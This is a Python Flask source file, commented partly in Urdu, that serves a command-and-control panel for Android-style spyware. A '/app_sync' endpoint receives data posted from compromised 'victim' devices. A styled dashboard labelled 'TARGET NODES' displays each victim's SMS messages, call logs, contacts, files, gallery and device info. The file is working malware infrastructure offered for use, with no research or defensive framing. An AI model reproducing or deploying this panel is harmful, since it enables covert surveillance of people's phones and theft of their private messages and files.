import os
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)
master_db = {}

# پریمیم موبائل انٹرفیس ڈیزائن
ADMIN_UI = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>📱 ULTRA-CORE V5 | COMMAND CENTER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --main-green: #00ff41; --bg-black: #0a0a0a; }
        body { background: var(--bg-black); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* وکٹم لسٹ (Left Bar) */
        .sidebar { width: 20%; background: #111; border-right: 1px solid #333; overflow-y: auto; padding: 10px; }
        .victim-card { padding: 15px; border: 1px solid #333; margin-bottom: 10px; cursor: pointer; border-radius: 8px; transition: 0.3s; }
        .victim-card:hover { border-color: var(--main-green); background: #1a1a1a; }
        .victim-card.active { border-color: var(--main-green); background: #1a1a1a; box-shadow: 0 0 10px var(--main-green); }

        /* مین ڈسپلے ایریا */
        .display-area { flex-grow: 1; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #1a1a1a 0%, #000 100%); position: relative; }

        /* موبائل فریم */
        .phone-frame { width: 320px; height: 650px; background: #000; border: 12px solid #222; border-radius: 40px; position: relative; box-shadow: 0 0 50px rgba(0,255,65,0.2); overflow: hidden; display: flex; flex-direction: column; }
        .phone-screen { flex-grow: 1; padding: 20px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; align-content: start; overflow-y: auto; background: url('https://wallpaperaccess.com/full/222436.jpg') center/cover; }
        
        /* ایپ آئیکنز */
        .app-icon { text-align: center; cursor: pointer; transition: transform 0.2s; }
        .app-icon:hover { transform: scale(1.1); }
        .app-icon i { width: 60px; height: 60px; background: rgba(255,255,255,0.1); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 28px; margin-bottom: 5px; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.2); }
        .app-name { font-size: 11px; font-weight: 500; text-shadow: 1px 1px 2px #000; }

        /* ڈیٹا ونڈو (موبائل کے اندر ڈیٹا دکھانے کے لیے) */
        #data-viewer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; flex-direction: column; z-index: 10; }
        .viewer-header { padding: 15px; background: #111; display: flex; align-items: center; border-bottom: 1px solid #333; }
        .viewer-content { padding: 15px; overflow-y: auto; font-size: 13px; color: #ccc; }
        
        .sms-item { background: #1a1a1a; padding: 10px; border-radius: 10px; margin-bottom: 10px; border-left: 3px solid var(--main-green); }
        .file-item { display: flex; align-items: center; padding: 8px; border-bottom: 1px solid #222; }
    </style>
</head>
<body>

<div class="sidebar">
    <h2 style="color:var(--main-green); font-size: 18px;"><i class="fas fa-ghost"></i> TARGET NODES</h2>
    <div id="victim-list">
        {% for id, data in master_db.items() %}
        <div class="victim-card" onclick="selectVictim('{{ id }}')">
            <div style="font-weight:bold;">📱 {{ data.model }}</div>
            <div style="font-size:10px; color:#888;">ID: {{ id }}</div>
            <div style="font-size:10px; color:var(--main-green);">● Online</div>
        </div>
        {% endfor %}
    </div>
</div>

<div class="display-area">
    <div class="phone-frame">
        <div class="phone-screen" id="app-grid">
            <div class="app-icon" onclick="showData('sms')">
                <i class="fas fa-comment-dots" style="color: #4cd964;"></i>
                <div class="app-name">Messages</div>
            </div>
            <div class="app-icon" onclick="showData('calls')">
                <i class="fas fa-phone-alt" style="color: #007aff;"></i>
                <div class="app-name">Phone</div>
            </div>
            <div class="app-icon" onclick="showData('contacts')">
                <i class="fas fa-user-friends" style="color: #ff9500;"></i>
                <div class="app-name">Contacts</div>
            </div>
            <div class="app-icon" onclick="showData('files')">
                <i class="fas fa-folder-open" style="color: #ffcc00;"></i>
                <div class="app-name">Files</div>
            </div>
            <div class="app-icon" onclick="showData('gallery')">
                <i class="fas fa-images" style="color: #ff2d55;"></i>
                <div class="app-name">Gallery</div>
            </div>
            <div class="app-icon" onclick="showData('info')">
                <i class="fas fa-cog" style="color: #8e8e93;"></i>
                <div class="app-name">Settings</div>
            </div>
        </div>

        <div id="data-viewer">
            <div class="viewer-header">
                <i class="fas fa-arrow-left" onclick="hideViewer()" style="cursor:pointer; margin-right: 15px;"></i>
                <span id="viewer-title">App</span>
            </div>
            <div class="viewer-content" id="viewer-body"></div>
        </div>
    </div>
</div>

<script>
    let currentData = null;
    let masterData = {{ master_db|tojson }};

    function selectVictim(id) {
        currentData = masterData[id];
        alert("Victim Selected: " + currentData.model);
    }

    function showData(type) {
        if (!currentData) { alert("Pehle Victim select karein!"); return; }
        const viewer = document.getElementById('data-viewer');
        const body = document.getElementById('viewer-body');
        const title = document.getElementById('viewer-title');
        
        viewer.style.display = 'flex';
        body.innerHTML = '';
        title.innerText = type.toUpperCase();

        if (type === 'sms') {
            currentData.sms.split('---').forEach(msg => {
                if(msg.trim()) body.innerHTML += `<div class="sms-item">${msg}</div>`;
            });
        } else if (type === 'files') {
            currentData.files.split('\\n').forEach(file => {
                body.innerHTML += `<div class="file-item"><i class="fas fa-file" style="margin-right:10px;"></i> ${file}</div>`;
            });
        } else {
            body.innerHTML = `<pre style="color:var(--main-green)">${currentData[type] || 'No Data Found'}</pre>`;
        }
    }

    function hideViewer() {
        document.getElementById('data-viewer').style.display = 'none';
    }
</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(ADMIN_UI, master_db=master_db)

@app.route('/app_sync', methods=['POST'])
def sync():
    try:
        req_data = request.json
        uid = req_data.get("device_id", "Unknown")
        master_db[uid] = req_data
        master_db[uid]["time"] = datetime.now().strftime("%H:%M:%S")
        return jsonify({"status": "SUCCESS"}), 200
    except:
        return jsonify({"status": "FAILED"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
